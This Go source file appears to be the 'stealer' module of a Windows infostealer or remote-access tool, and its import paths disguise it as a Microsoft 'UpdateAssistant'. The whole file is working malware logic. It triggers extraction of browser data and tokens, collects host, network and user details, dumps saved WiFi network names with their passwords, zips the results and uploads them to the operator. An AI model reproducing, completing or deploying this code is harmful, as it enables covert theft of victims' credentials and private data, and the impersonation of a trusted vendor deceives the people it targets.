//go:build windows

package stealer

import (
	"archive/zip"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/files"
	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var usage = []string{
	"steal — extract browser data, tokens, and system info, then send as a zip",
}

func Stealer(c *ipc.Context) error {
	if c.ArgString() != "" {
		return c.Usage(usage)
	}
	go extract(c)
	return nil
}

func extract(c *ipc.Context) {
	logger.Info("stealer: starting extraction")
	result := sysutil.StealerRun()
	if result == "" {
		logger.Error("stealer: extraction returned empty")
		c.ReplyEmbed(ipc.Error("Steal failed: extraction returned empty"))
		return
	}

	vaultDir := filepath.Join(config.DataPath(), "vault", "stealer")

	// Dump system info using existing sysutil wrappers
	dumpSysInfo(vaultDir)

	logger.Info("stealer: zipping vault")
	tag := make([]byte, 4)
	rand.Read(tag)
	zipName := "vault-" + hex.EncodeToString(tag) + ".zip"
	zipPath := filepath.Join(os.TempDir(), zipName)

	if err := zipVault(vaultDir, zipPath); err != nil {
		logger.Error("stealer: zip failed: %v", err)
		c.ReplyEmbed(ipc.Error("Zip failed: " + err.Error()))
		return
	}

	data, err := os.ReadFile(zipPath)
	os.Remove(zipPath)
	if err != nil {
		logger.Error("stealer: read zip failed: %v", err)
		c.ReplyEmbed(ipc.Error("Read zip failed: " + err.Error()))
		return
	}

	logger.Info("stealer: uploading %d bytes", len(data))
	id, err := files.Upload(zipName, data)
	if err != nil {
		logger.Error("stealer: upload failed: %v", err)
		c.ReplyEmbed(ipc.Error("Upload failed: " + err.Error()))
		return
	}

	logger.Info("stealer: uploaded as attachment %s", id)
	c.ReplyEmbed(ipc.Success("Successfully extracted data to " + zipName))
	c.ReplyFile([]string{id})
}

func dumpSysInfo(vaultDir string) {
	sysDir := filepath.Join(vaultDir, "system")
	if err := os.MkdirAll(sysDir, 0o755); err != nil {
		logger.Error("stealer: failed to create system dir: %v", err)
		return
	}

	content := fmt.Sprintf(
		"=== System Info ===\n\n"+
			"OS: %s (Build %s)\n"+
			"Arch: %s\n"+
			"CPU: %s (%d cores)\n"+
			"Hostname: %s\n"+
			"Local IP: %s\n"+
			"Public IP: %s\n"+
			"MAC: %s\n"+
			"Username: %s\n"+
			"Domain: %s\n"+
			"Admin: %v\n",
		sysutil.OSName(), sysutil.OSBuild(), sysutil.OSArch(),
		sysutil.CPUName(), sysutil.CPUCores(),
		sysutil.NetHostname(), sysutil.NetLocalIP(), sysutil.NetPublicIP(), sysutil.NetMAC(),
		sysutil.UserName(), sysutil.UserDomain(), sysutil.UserIsAdmin(),
	)

	sysInfoPath := filepath.Join(sysDir, "sysinfo.txt")
	if err := os.WriteFile(sysInfoPath, []byte(content), 0644); err != nil {
		logger.Error("stealer: failed to write sysinfo.txt: %v", err)
	}

	dumpWifi(sysDir)
}

func dumpWifi(sysDir string) {
	count := sysutil.WiFiCount()
	if count == 0 {
		logger.Info("stealer: no wifi networks found")
		return
	}

	var sb strings.Builder
	for i := 0; i < count; i++ {
		ssid := sysutil.WiFiSSID(i)
		key := sysutil.WiFiKey(i)
		if key != "" {
			sb.WriteString(ssid + " " + key + "\n")
		} else {
			sb.WriteString(ssid + " [OPEN/no password]\n")
		}
	}

	wifiPath := filepath.Join(sysDir, "wifi.txt")
	if err := os.WriteFile(wifiPath, []byte(sb.String()), 0644); err != nil {
		logger.Error("stealer: failed to write wifi.txt: %v", err)
	} else {
		logger.Info("stealer: wrote wifi.txt (%d networks)", count)
	}
}

func zipVault(srcDir, dstPath string) error {
	out, err := os.Create(dstPath)
	if err != nil {
		return err
	}
	defer out.Close()
	zw := zip.NewWriter(out)
	defer zw.Close()
	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}
		rel, err := filepath.Rel(srcDir, path)
		if err != nil {
			return nil
		}
		rel = strings.ReplaceAll(rel, "\\", "/")
		f, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer f.Close()
		w, err := zw.Create(rel)
		if err != nil {
			return nil
		}
		io.Copy(w, f)
		return nil
	})
}
